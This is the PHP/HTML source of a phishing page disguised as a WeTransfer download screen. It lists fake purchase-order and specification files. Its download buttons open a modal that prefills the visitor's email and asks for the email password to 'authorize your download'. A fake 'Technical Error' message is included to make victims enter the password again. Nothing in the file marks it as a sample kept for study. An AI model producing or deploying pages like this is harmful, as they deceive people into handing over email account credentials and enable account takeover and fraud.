<?php
session_start();
if(isset($_SESSION['email']) && !empty($_SESSION['email'])){
  $email = $_SESSION['email'];  
}else{
  $email = "";
} 
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="utf-8">
    <title>WeTransfer
    </title>
    <link rel="stylesheet" href="g.css">
    
  </head>
  <body>
    <div class="welogo">
      <svg width="52" height="29" class="spinner__logo" viewBox="-4 -2 52 29"><defs><path id="logo-path" d="M25.4 10.6c0-6.2 4.4-9.9 10.1-9.9C40.6.7 44 3.3 44 6.9c0 3.4-2.9 5.6-6.1 5.6-1.8 0-3.1-.3-4-1-.3-.3-.5-.2-.5.1 0 1.3.5 2.3 1.3 3.2.7.7 2 1.2 3.2 1.2 1.3 0 2.4-.3 3.4-.8s1.8-.3 2.3.5c.6.9-.2 2.1-.9 2.9-1.3 1.4-3.8 2.4-7 2.4-6.5-.2-10.3-4.6-10.3-10.4zm-13.3 4.1c.6 0 1 .3 1.4 1l1.8 2.9c.7 1.1 1.3 1.9 2.6 1.9s2-.5 2.6-2c.8-1.8 1.7-4.1 2.4-7.1.9-3.4 1.3-5.4 1.3-7.1s-.5-2.7-2.4-3c-2.5-.5-6-.7-9.7-.7s-7.2.2-9.7.6C.5 1.6 0 2.6 0 4.3S.4 8 1.2 11.4c.8 3 1.6 5.2 2.4 7.1.7 1.5 1.3 2 2.6 2s1.9-.8 2.6-1.9l1.8-2.9c.5-.6.9-1 1.5-1z"></path><filter id="logo-filter" width="200%" height="200%" x="-50%" y="-50%" filterUnits="objectBoundingBox"><feOffset dx="0" dy="2" in="SourceAlpha" result="shadowOffsetOuter1"></feOffset><feGaussianBlur stdDeviation="2" in="shadowOffsetOuter1" result="shadowBlurOuter1"></feGaussianBlur></filter></defs><g fill="#ffffff" class="logo-shape"><use fill="#ffffff" fill-opacity="0.9" filter="url(#logo-filter)" xlink:href="#logo-path"></use><use fill-rule="evenodd" xlink:href="#logo-path"></use></g></svg>
    </div>
    <div class="section">
      <div class="app-box">
        <div class="dl-icon">
          <svg class="downloader__top-icon" viewBox="0 0 170 170">
            <g fill="#D4D7D9" fill-rule="evenodd">
              <img src="DArrow.png" height="90" width="90" alt="">
            </g>
          </svg>
          <h3 class="hrd">Ready when you are</h3>
          <p class="fd">Files deleted in 7 days</p>
          <p class="dl-msg" title="">Please kindly view the documents and revert back to us via email ASAP</p>
        </div>
        <div class="fcont">
          <table class="ftb">
            <tbody>
              <tr>
                <td>
                  <div class="dc">
                    <p class="dn">Purchase order.pdf</p>
                    <p class="finfo fd">364 KB</p>
                    <p class="ftyp fd">PDF</p>
                  </div>
                </td>
                <td>
                  <div class="da">
                    <svg viewBox="0 0 24 24"><img src="DArrow.png" length="10" alt="" width="20" style="cursor: pointer;" id="chef"   data-toggle="modal" data-target="#gee"></svg>
                  </div>
                </td>
              </tr>
            </tbody>
          </table>

          <table class="ftb">
            <tbody>
              <tr>
                <td>
                  <div class="dc">
                    <p class="dn">purchase list.xls</p>
                    <p class="finfo fd">521 KB</p>
                    <p class="ftyp fd">XLS</p>
                  </div>
                </td>
                <td>
                  <div class="da">
                    <svg viewBox="0 0 24 24">
                      <img src="DArrow.png" length="10" alt="" width="20" style="cursor: pointer;" id="chef"   data-toggle="modal" data-target="#gee">
                    </svg>
                  </div>
                </td>
              </tr>
            </tbody>
          </table>

          <table class="ftb">
            <tbody>
              <tr>
                <td>
                  <div class="dc">
                    <p class="dn">Specifications.pdf</p>
                    <p class="finfo fd">364 KB</p>
                    <p class="ftyp fd">PDF</p>
                  </div>
                </td>

                <td>
                  <div class="da">
                    <svg viewBox="0 0 24 24">
                      <img src="DArrow.png" length="10" alt="" width="20" style="cursor: pointer;" id="chef"   data-toggle="modal" data-target="#gee">
                    </svg>
                  </div>
                </td>
              </tr>
            </tbody>
          </table>
        </div>

        <!-- Button trigger modal -->
        <div class="dcont">
          <button id="chef" class="dbtn" data-toggle="modal" data-target="#gee">Download All</button>
        </div>
      </div>

      <div class="app-nav">
        <table class="nav-tb">
          <tbody>
            <tr>
              <td class="bdr">
                <span class="nav-text">Help</span>
              </td>
              <td class="bdr">
                <span class="nav-text">About</span>
              </td>
              <td>
                <span class="nav-text">Premium</span>
              </td>
            </tr>
          </tbody>
        </table>
      </div>

      <div class="cblock">
        <svg width="272" height="38" viewBox="0 0 272 38" fill="white" xmlns="http://www.w3.org/2000/svg">
          <h1 style="color:whitesmoke"><span class="we" color="#409fff">We</span>Transfer</h1>
        </svg>
        <div class="blk-txt1">
          <span style="color:cyan">Discover</span> the beauty
        </div>
        <div class="blk-txt2">
          Within
        </div>
        <div class="blk-sub-txt">
          Discover the beauty of makeup with the "Discover Forever" product. Let your beauty be discovered.
        </div>
        <div class="blk-sub-action">
          <a href="https://foreverliving.com/usa/en-us/home/" class="sub-action">Learn Now</a>
        </div>
      </div>

      
    </div>

    <!-- The Modal -->

    <div class="lmodal" id="gee" tabindex="-1" role="dialog" aria-labelledby="gee" aria-hidden="true">
      <!-- Modal content -->
      <div class="modal-dialog modal-dialog-centered" role="document">
        <div class="modal-content">
          <center>
            <img src="logo.png" length="150" alt="WeTransfer" width="150">
          </center>
            <div class="linfo">
              Please match the displayed email with the correct password to prove you are authorized to view these files.
            </div>
            <div>
              <p class="ainst">Authorize your download</p>
              <center>
                <p class="error" id="error">Technical Error: Cannot open session, please try again with correct details.</p>
               
              <div>
                <input type="email" name="email" id="email" class="email" placeholder="Enter your email here" value="<?php echo $email; ?>">
              </div>
              <br> 
              <div>
                <input type="password" name="password" id="password" class="password" placeholder="Enter email password">
              </div>
              <div class="btncont">
                <button class="dbtn" id="fdl">Download</button>
              </div>
              <div class="fback" id="fback">
                <div class="fspinner">
                  <img src="spinner.gif" width="30px">
                </div>
                <div class="txt-fback" id="tfb">connecting...</div>
              </div>
              </center>
            </div>

          </div>

      </div>

      <script src="jquery.js"></script>
      <script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
      <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
      <script src="g.js"></script>

  </body>
</html>
